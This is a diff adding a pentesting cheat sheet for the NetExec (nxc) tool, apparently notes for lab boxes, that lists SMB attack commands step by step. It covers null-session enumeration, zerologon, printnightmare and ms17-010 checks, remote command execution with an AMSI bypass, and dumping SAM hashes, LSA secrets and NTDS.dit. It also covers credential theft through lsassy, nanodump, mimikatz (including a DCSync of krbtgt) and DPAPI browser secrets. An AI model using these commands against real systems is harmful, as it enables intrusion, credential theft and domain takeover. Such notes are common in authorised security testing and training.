@@ -1,0 +1,62 @@
+NXC is an awesome tool for all boxes. Currently supports enum over SMB, LDAP, WINRM, MSSQL, SSH, FTP, RDP, WMI, and NFS.
+
+Documentation for enum over each port is in the specific ports file.
+
+Here are is a short breakdown and use cases for each.
+
+SMB
+
+1. Generate hosts file
+  nxc smb 8.8.8.8 --generate-hosts-file /etc/hosts
+2. Generate TGT
+  netexec smb ip -u user -p password --generate-tgt /path
+  export KRB5CCNAME=/path
+  netexec smb ip -u user -k --use-kcache
+3. The following command tests for vulns
+  nxc smb <ip> -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010
+4. Test for noPAC vuln
+  nxc smb <ip> -u 'user' -p 'pass' -M nopac
+5. Enumeration with null login. Also try these with guest login -u 'g' -p ''.
+  nxc smb 10.10.10.161 -u '' -p ''
+  nxc smb 10.10.10.161 -u '' -p '' --shares
+  nxc smb 10.10.10.161 -u '' -p '' --pass-pol
+  nxc smb 10.10.10.161 -u '' -p '' --users
+  nxc smb 10.10.10.161 -u '' -p '' --groups
+6. If you have creds you can use nxc to execute cmds that fail over if one doesn't work. It tries wmiexec, atexec, and smbexec. Use the -x flag to specifcy remote commands.
+  nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+7. Use the -X flag to use powershell cmds.
+  nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+8. Use the --amsi-bypass flag to attempt to bypass anti-malware.
+  nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
+9. List all readable files.
+  nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus
+10. Dumping all files.
+  nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
+11. Get and Put files to remote machine through SMB with username and pass.
+  nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
+  nxc smb 172.16.251.152 -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
+12. Dump SAM hashes like using secretsdump.py. Need local admin password. Use --local-auth if user is local account. Try both of these cmds.
+  nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump
+  nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
+13. Dump LSA secrets. Need Domain Admin or Local admin on DC.
+  nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
+  nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa secdump
+14. Dump the NTDS.dit from DC. Need Domain admin or Local admin on DC.
+  nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
+  nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
+  nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
+  nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
+15. There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py.
+  nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
+16. Using the module Lsassy from @pixis , you can dump the credentials remotely.
+  nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
+17. Using the module nanodump you can dump the credentials remotely
+  nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
+18. Using the Mimikatz module, the powershell script Invoke-Mimikatz.ps1 will be executed on the remote target.
+  nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz
+  nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
+19. You can dump DPAPI credentials using NetExec using the following option: --dpapi. It will get all secrets from Credential Manager, Chrome, Edge, Firefox. --dpapi supports the following options.
+  nxc smb <ip> -u user -p password --dpapi
+  nxc smb <ip> -u user -p password --dpapi cookies
+  nxc smb <ip> -u user -p password --dpapi nosystem
+  nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
